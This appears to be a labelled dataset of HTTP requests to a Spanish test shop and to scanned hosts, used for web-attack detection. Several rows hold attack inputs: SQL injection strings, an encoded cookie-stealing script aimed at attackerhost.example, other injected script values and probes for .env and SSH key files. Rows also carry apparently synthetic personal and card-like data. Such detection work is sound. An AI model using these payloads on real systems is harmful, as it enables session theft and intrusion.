text_input,method,url_path,query_params,request_payload,user_agent,response_status,label,attack_type,source
POST /tienda1/publico/anadir.jsp [SEP]  id=3&nombre=Queso+Manchego&precio=100&cantidad=11&B1=A%F1adir+al+carrito [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=C78EF0619931246335C03609BC0C78EF localhost:8080  ,POST,/tienda1/publico/anadir.jsp,,id=3&nombre=Queso+Manchego&precio=100&cantidad=11&B1=A%F1adir+al+carrito,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
POST /tienda1/publico/registro.jsp [SEP]  modo=%2B&login=michaud&password=41g4i1a487ad1&nombre=Enoch&apellidos=Demuner&email=stevensen7%40deltamarina.cat&dni=50873406M&direccion=Emigrante+50%2C+&ciudad=Monroyo&cp=30191&provincia=Guadalajara&ntc=8474012494914092&B1=Registrar [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=80B59E38044153144B49FE0E440FAD7F localhost:8080  ,POST,/tienda1/publico/registro.jsp,,modo=%2B&login=michaud&password=41g4i1a487ad1&nombre=Enoch&apellidos=Demuner&email=stevensen7%40deltamarina.cat&dni=50873406M&direccion=Emigrante+50%2C+&ciudad=Monroyo&cp=30191&provincia=Guadalajara&ntc=8474012494914092&B1=Registrar,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/miembros/editar.jsp [SEP] modo=registro&login=koichi&password=9ara&nombre=Ingrid&apellidos=Ushi%F1ahua&email=gorin.mccracken%40evelin.am&dni=23593437Z&direccion=C%2F+Rio+Segura+76+&ciudad=Portillo+de+Toledo&cp=05292&provincia=Madrid&ntc=0600142480531797&B1=Registrar  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=C92A2459A33ADBA4FECEFA8F3C5374A6 localhost:8080  ,GET,/tienda1/miembros/editar.jsp,modo=registro&login=koichi&password=9ara&nombre=Ingrid&apellidos=Ushi%F1ahua&email=gorin.mccracken%40evelin.am&dni=23593437Z&direccion=C%2F+Rio+Segura+76+&ciudad=Portillo+de+Toledo&cp=05292&provincia=Madrid&ntc=0600142480531797&B1=Registrar,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/miembros/salir.jsp [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=83A5C523D6129464516727F172DC22E3 localhost:8080  ,GET,/tienda1/miembros/salir.jsp,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
POST /tienda1/publico/autenticar.jsp [SEP]  modo=entrar&login=charissa&pwd=t99n6a&remember=on&B1=Entrar [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=BFCC4673C89A87834909CA9865B8839C localhost:8080  ,POST,/tienda1/publico/autenticar.jsp,,modo=entrar&login=charissa&pwd=t99n6a&remember=on&B1=Entrar,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
POST /tienda1/miembros/editar.jsp [SEP]  modo=registro&login=koay&password=e*mbermejecer&nombre=Baroncio&apellidos=Monjo+Porto&email=ahna%40zampy.in&dniA=26293513M&direccion=Calle+Ramon+De+Campoamor%2C+165+5%3FG&ciudad=Vilamacolum&cp=19245&provincia=Badajoz&ntc=1165920681066048&B1=Registrar [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=8D4A1D5C2896F4E3C7D2613F699870C3 localhost:8080  ,POST,/tienda1/miembros/editar.jsp,,modo=registro&login=koay&password=e*mbermejecer&nombre=Baroncio&apellidos=Monjo+Porto&email=ahna%40zampy.in&dniA=26293513M&direccion=Calle+Ramon+De+Campoamor%2C+165+5%3FG&ciudad=Vilamacolum&cp=19245&provincia=Badajoz&ntc=1165920681066048&B1=Registrar,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/publico/autenticar.jsp [SEP] modo=entrar&login=ziemba&pwd=bAnDAd_a&remember=on&B1=Entrar  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=38180E2D7A8A6AACCB341AA09B1A3DA4 localhost:8080  ,GET,/tienda1/publico/autenticar.jsp,modo=entrar&login=ziemba&pwd=bAnDAd_a&remember=on&B1=Entrar,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/asf-logo-wide [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=2E1FA64607768F00064228239DBAD620 localhost:8080  ,GET,/tienda1/asf-logo-wide,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/global/estilos.css [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=022987B8F0A4A1EC85A90AAA9C84F473 localhost:8080  ,GET,/tienda1/global/estilos.css,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/publico/vaciar.jsp [SEP] B2=Vaciar+carrito%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=B3315392CA7852B038B77BF823FEB48F localhost:8080  ,GET,/tienda1/publico/vaciar.jsp,B2=Vaciar+carrito%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,sqli,csic2010
GET /tienda1/imagenes/nuestratierra.jpg [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=E999F7439BF4E57E9E784CDB6CF4533E localhost:8080  ,GET,/tienda1/imagenes/nuestratierra.jpg,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET / [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=019BB325DFB97E233B83B0943D3CAD61 localhost:8080  ,GET,/,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /sitemap.xml [SEP]   [SEP] Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/) [SEP]     ,GET,/sitemap.xml,,,Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/),404,1,scanning,loki_exp1
GET /tienda1/publico/registro.jsp [SEP] modo=registro&login=vadi&password=Calif%F3rnico&nombre=Jerusal%E9n&apellidos=Gering&email=dantas.pellegrim4%40nanotecnologo.kr&dni=73502486Y&direccion=Escuelas+148%2C+&ciudad=Villarejo+del+Valle&cp=05412&provincia=Zamora&ntc=2774742421964079&B1=Registrar  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=B165C2F055FE247BF82495FB2181AAAD localhost:8080  ,GET,/tienda1/publico/registro.jsp,modo=registro&login=vadi&password=Calif%F3rnico&nombre=Jerusal%E9n&apellidos=Gering&email=dantas.pellegrim4%40nanotecnologo.kr&dni=73502486Y&direccion=Escuelas+148%2C+&ciudad=Villarejo+del+Valle&cp=05412&provincia=Zamora&ntc=2774742421964079&B1=Registrar,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/imagenes/nuestratierra.jpg [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=29D45783D29A398F065DCDE87CEAEAEB localhost:8080  ,GET,/tienda1/imagenes/nuestratierra.jpg,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
POST /tienda1/publico/vaciar.jsp [SEP]  B2A=Vaciar+carrito [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=65B92A7A57F814F521151B91043E83EB localhost:8080  ,POST,/tienda1/publico/vaciar.jsp,,B2A=Vaciar+carrito,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/publico/anadir.jsp [SEP] id=3&nombre=Ques%2Bo+Manchego&precio=39&cantidad=3&B1=A%F1adir+al+carrito  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=76F2AAD35875B371ABABC9D18DE6276F localhost:8080  ,GET,/tienda1/publico/anadir.jsp,id=3&nombre=Ques%2Bo+Manchego&precio=39&cantidad=3&B1=A%F1adir+al+carrito,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/publico/productos.jsp [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=96743F0A9F08D8FFD824690677647C59 localhost:8080  ,GET,/tienda1/publico/productos.jsp,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
POST /tienda1/publico/registro.jsp [SEP]  modo=registro&login=maheu&password=revelante&nombre=Agapito&apellidos=Ca%F1abate+Liano&email=aguglia.vaughn%4020horas.cc&dni=73732702S&direccion=C%2F+Balmes%2C+66%2C+&ciudad=Almacelles&cp=24206&provincia=Lleida&ntc=1764884801392734&B1=Registrar [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=D7BBA539746B7D15EDB8B3B04E5A3C38 localhost:8080  ,POST,/tienda1/publico/registro.jsp,,modo=registro&login=maheu&password=revelante&nombre=Agapito&apellidos=Ca%F1abate+Liano&email=aguglia.vaughn%4020horas.cc&dni=73732702S&direccion=C%2F+Balmes%2C+66%2C+&ciudad=Almacelles&cp=24206&provincia=Lleida&ntc=1764884801392734&B1=Registrar,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/publico/caracteristicas.jsp [SEP] id=sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=1814FF7A9873694D04206AAA941F2AAF localhost:8080  ,GET,/tienda1/publico/caracteristicas.jsp,id=sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/asf-logo-wide.gif.Bak [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=BCCC009B2354CBC229231DE3673C5D8F localhost:8080  ,GET,/tienda1/asf-logo-wide.gif.Bak,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/global/menum.jsp [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=D48764DB06D7A968B8494D5A30F44D71 localhost:8080  ,GET,/tienda1/global/menum.jsp,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/publico/caracteristicas.jsp [SEP] id=1  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=6B376A5DB1BBD2FF5D804A30F1096C55 localhost:8080  ,GET,/tienda1/publico/caracteristicas.jsp,id=1,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
POST /tienda1/publico/entrar.jsp [SEP]  errorMsg=Set-cookie%253A%2BTamper%253D1041264011025374727 [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=56A39361F6F8BE8DF140A1D387BD3C8C localhost:8080  ,POST,/tienda1/publico/entrar.jsp,,errorMsg=Set-cookie%253A%2BTamper%253D1041264011025374727,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/publico/caracteristicas.jsp [SEP] id=1%27OR%27a%3D%27a  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=C0BCDB56CBF8659E62C5DF7B16F80CE9 localhost:8080  ,GET,/tienda1/publico/caracteristicas.jsp,id=1%27OR%27a%3D%27a,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/publico/vaciar.jsp [SEP] B2A=Vaciar+carrito  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=07E6A13A64B8BFF8BA29B847147DB622 localhost:8080  ,GET,/tienda1/publico/vaciar.jsp,B2A=Vaciar+carrito,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/miembros/imagenes/castro.jpg [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=6FCCDEA1C3CC1B06B3856812F617CE03 localhost:8080  ,GET,/tienda1/miembros/imagenes/castro.jpg,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/publico/autenticar.jsp [SEP] modo=entrar&login=lafleur&pwd=POlvORADuQue&remember=on&B1=Entrar  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=3FC5543B0295926C3C2A95E6EE9292EE localhost:8080  ,GET,/tienda1/publico/autenticar.jsp,modo=entrar&login=lafleur&pwd=POlvORADuQue&remember=on&B1=Entrar,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
POST /tienda1/publico/registro.jsp [SEP]  modo=registro&login=ervin&password=nodal&nombre=Agust%EDn&apellidos=Artigas+Girut&email=mattos%40velazquezlarra%F1aga.dd&dni=55912738Z&direccion=C%2F+Torcuato+Perez%2C+69%2C+&ciudad=Candelario&cp=41960&provincia=Le%F3n&ntc=7208264078394889&B1=Registrar [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=3767A88FABDE1DBE6BA5AF97554AB88F localhost:8080  ,POST,/tienda1/publico/registro.jsp,,modo=registro&login=ervin&password=nodal&nombre=Agust%EDn&apellidos=Artigas+Girut&email=mattos%40velazquezlarra%F1aga.dd&dni=55912738Z&direccion=C%2F+Torcuato+Perez%2C+69%2C+&ciudad=Candelario&cp=41960&provincia=Le%F3n&ntc=7208264078394889&B1=Registrar,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/global/titulo.jsp [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=173601EE399D189386C2C82A2913C7A9 localhost:8080  ,GET,/tienda1/global/titulo.jsp,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
POST /tienda1/publico/pagar.jsp [SEP]  modo=insertar&precio=4320&B1=Pasar+por+caja%2F [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=164318EF50AE9A78F719DB9FE5A765CD localhost:8080  ,POST,/tienda1/publico/pagar.jsp,,modo=insertar&precio=4320&B1=Pasar+por+caja%2F,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /core/public/config.env [SEP]   [SEP] curl/8.7.1 [SEP]     ,GET,/core/public/config.env,,,curl/8.7.1,404,1,scanning,loki_exp1
POST /tienda1/publico/caracteristicas.jsp [SEP]  id=1 [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=F1A16BB7DDAE8D10D5FDC49ABEA3F803 localhost:8080  ,POST,/tienda1/publico/caracteristicas.jsp,,id=1,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /back-api/.env [SEP]   [SEP] curl/8.7.1 [SEP]     ,GET,/back-api/.env,,,curl/8.7.1,404,1,scanning,loki_exp1
GET /tienda1/publico/carrito.jsp [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=11A3A5ED3CA8B135C9F050BEC6A3DDFE localhost:8080  ,GET,/tienda1/publico/carrito.jsp,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
POST /tienda1/publico/vaciar.jsp [SEP]  B2=%2500 [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP] application/x-www-form-urlencoded JSESSIONID=CC9324CA1CC0A8EC04B632CF34B4C7DB localhost:8080  ,POST,/tienda1/publico/vaciar.jsp,,B2=%2500,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/miembros/editar.jsp [SEP] modo=registro&login=pepple&password=endelgadecer&nombre=Nolsaco&apellidos=Antol%EDnez+Tamallangos&email=hassall%40007tv.nf&dni=80856285S&direccion=C%2F+Capitanes+Ripoll%2C+68%2C+9-G&ciudad=Pajaroncillo&cp=01120&provincia=Madrid&ntc=3246974816793870&B1=Registrarparos%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=161AAE204453783AFDAC3CFAAA8B9468 localhost:8080  ,GET,/tienda1/miembros/editar.jsp,modo=registro&login=pepple&password=endelgadecer&nombre=Nolsaco&apellidos=Antol%EDnez+Tamallangos&email=hassall%40007tv.nf&dni=80856285S&direccion=C%2F+Capitanes+Ripoll%2C+68%2C+9-G&ciudad=Pajaroncillo&cp=01120&provincia=Madrid&ntc=3246974816793870&B1=Registrarparos%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/publico/pagar.jsp [SEP] modo=insertar&precio=1214&B1=Confirmar  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=9BBDB91A1E7E698FA2BD09C230F4D67F localhost:8080  ,GET,/tienda1/publico/pagar.jsp,modo=insertar&precio=1214&B1=Confirmar,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/global/titulo.jsp [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=A1691F40E593E87892018F0C8B9352ED localhost:8080  ,GET,/tienda1/global/titulo.jsp,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
"POST /jsonrpc [SEP]  {""jsonrpc"":""2.0"",""id"":1,""method"":""initialize"",""params"":{""protocolVersion"":""2025-03-26"",""clientInfo"":{""name"":""Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"",""version"":""1.0""},""capabilities"":{}}} [SEP] Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/) [SEP]     ",POST,/jsonrpc,,"{""jsonrpc"":""2.0"",""id"":1,""method"":""initialize"",""params"":{""protocolVersion"":""2025-03-26"",""clientInfo"":{""name"":""Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"",""version"":""1.0""},""capabilities"":{}}}",Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/),404,1,scanning,loki_exp1
GET /tienda1/publico/registro.jsp [SEP] modo=registro&login=cathal&password=ce%2Fre_b56l&nombre=Apeles&apellidos=Capafons+Melgarejo&email=crane7%40privatebanking.com.nc&dni=80723845D&direccion=C%2F+Doctor+Sanchez+Cozar%2C+88%2C+&ciudad=Herrera%2C+La&cp=24100&provincia=Lleida&ntc=9690651027798587&B1=Registrar  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=08FA759E9D965814D2BE1202D55F25EC localhost:8080  ,GET,/tienda1/publico/registro.jsp,modo=registro&login=cathal&password=ce%2Fre_b56l&nombre=Apeles&apellidos=Capafons+Melgarejo&email=crane7%40privatebanking.com.nc&dni=80723845D&direccion=C%2F+Doctor+Sanchez+Cozar%2C+88%2C+&ciudad=Herrera%2C+La&cp=24100&provincia=Lleida&ntc=9690651027798587&B1=Registrar,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/global/menum.jsp [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=0A1A19C3BFF4A26003E8FE0C3AA8FE2E localhost:8080  ,GET,/tienda1/global/menum.jsp,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,0,normal,csic2010
GET /tienda1/publico/anadir.jsp [SEP] id=2&nombre=Ques%2Bo+Manchego&precio=39&cantidad=84&B1=A%F1adir+al+carrito  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=6FD92250C2C76A523BE40E8579984F73 localhost:8080  ,GET,/tienda1/publico/anadir.jsp,id=2&nombre=Ques%2Bo+Manchego&precio=39&cantidad=84&B1=A%F1adir+al+carrito,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /tienda1/miembros/editar.jsp [SEP] modo=registro&login=gustave&password=v3o8720a&nombre=Baldome%2Fro&apellidos=Fain%E9+Motj%E9&email=dyne%40somosagelespa%F1a.us&dni=30663985V&direccion=Calle+Antonio+Gramsci+30%2C+12%3FB&ciudad=Narros+del+Puerto&cp=40183&provincia=Zamora&ntc=4102151120364510&B1=Registrar  [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=3E421DF7C82B90BEE0AC4E76E03249CA localhost:8080  ,GET,/tienda1/miembros/editar.jsp,modo=registro&login=gustave&password=v3o8720a&nombre=Baldome%2Fro&apellidos=Fain%E9+Motj%E9&email=dyne%40somosagelespa%F1a.us&dni=30663985V&direccion=Calle+Antonio+Gramsci+30%2C+12%3FB&ciudad=Narros+del+Puerto&cp=40183&provincia=Zamora&ntc=4102151120364510&B1=Registrar,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
GET /.ssh/authorized_keys.tmp [SEP]   [SEP] curl/8.7.1 [SEP]     ,GET,/.ssh/authorized_keys.tmp,,,curl/8.7.1,404,1,scanning,loki_exp1
GET /core/src/main/resources/org/jobrunr/dashboard/frontend/.env [SEP]   [SEP] curl/8.7.1 [SEP]     ,GET,/core/src/main/resources/org/jobrunr/dashboard/frontend/.env,,,curl/8.7.1,404,1,scanning,loki_exp1
GET /tienda1/global/menum.jsp/6909030637832563290.jsp.Old [SEP]   [SEP] Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) [SEP]  JSESSIONID=C5BB2682AE82B9847AB09293B3CA210A localhost:8080  ,GET,/tienda1/global/menum.jsp/6909030637832563290.jsp.Old,,,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),-1,1,other_anomaly,csic2010
